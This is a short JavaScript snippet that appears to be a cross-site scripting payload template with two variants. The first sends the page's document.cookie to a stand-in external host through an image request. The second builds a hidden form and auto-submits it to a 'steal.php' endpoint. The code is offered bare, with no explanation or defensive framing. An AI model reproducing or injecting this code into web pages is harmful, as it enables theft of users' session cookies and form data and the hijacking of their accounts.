<!--GET-->
new Image().src = "http://www.example.com/"+escape(document.cookie);

location.href= ...

<!--POST-->
function new_form(){
	var f = document.createElement("form");
	document.body.appendChild(f);
	f.method = "post";
	return f;
}
function create_elements(eform, ename, evalue){
	var e = document.createElement("input");
	eform.appendChild(e);
	e.type = 'text';
	e.name = ename;
	if(!document.all){e.style.display = 'none';}else{
		e.style.display = 'block';
		e.style.width = '0px';
		e.style.height = '0px';
	}
	e.value = evalue;
	return e;
}
var _f = new_form();
create_elements(_f, "name1", "value1");     // form input
create_elements(_f, "name2", "value2");
_f.action = "http://www.example.com/steal.php";   // submit target
_f.submit();